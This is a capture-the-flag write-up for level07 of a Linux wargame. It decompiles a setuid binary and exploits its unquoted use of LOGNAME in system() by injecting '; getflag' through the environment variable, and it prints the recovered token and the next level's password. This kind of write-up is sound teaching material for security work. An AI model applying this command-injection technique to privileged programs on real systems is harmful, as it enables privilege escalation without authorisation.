# level07

Target is `flag07`. SCOUTING:

```sh
ls -lA
```

File:

```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

What is it?

```sh
file level07
```

Output:

```
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

Ghidra-time!

```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

Although it's pretty ugly, we can pretty much see what happens here. It's as simple as `echo $LOGNAME`. The `system()` function does not handle quoting whatsoever. This is probably what we need to exploit here.

```sh
env LOGNAME='; whoami' ./level07
```

Output:

```

flag07
```

Yep. Let's do the same for `getflag`.

```sh
env LOGNAME='; getflag' ./level07
```

Output:

```

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Let's check the token:

```
level08@localhost's password: fiumuikeil55xe9cu4dood66h
```

Next!
